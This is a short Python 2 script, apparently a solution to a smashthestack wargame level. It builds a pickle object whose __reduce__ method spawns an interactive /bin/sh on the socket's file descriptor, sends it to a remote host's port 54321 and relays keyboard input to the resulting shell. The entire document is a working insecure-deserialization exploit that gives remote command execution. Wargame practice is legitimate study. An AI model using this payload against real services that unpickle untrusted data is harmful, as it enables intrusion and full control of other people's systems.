import socket
import cPickle as pickle
import cPickle
import subprocess
import sys

class Execute(object):
    def __reduce__(self):
        return(subprocess.call, (('/bin/sh','-i'),0,None,4,4,4))

s = socket.socket()
s.connect(('amateria.smashthestack.org', 54321))
print s.recv(256)
s.send(pickle.dumps(Execute()))
while 1 == 1:
	print s.recv(512)
	msg = sys.stdin.readline()
        s.send(msg + '\r\n')
s.close()



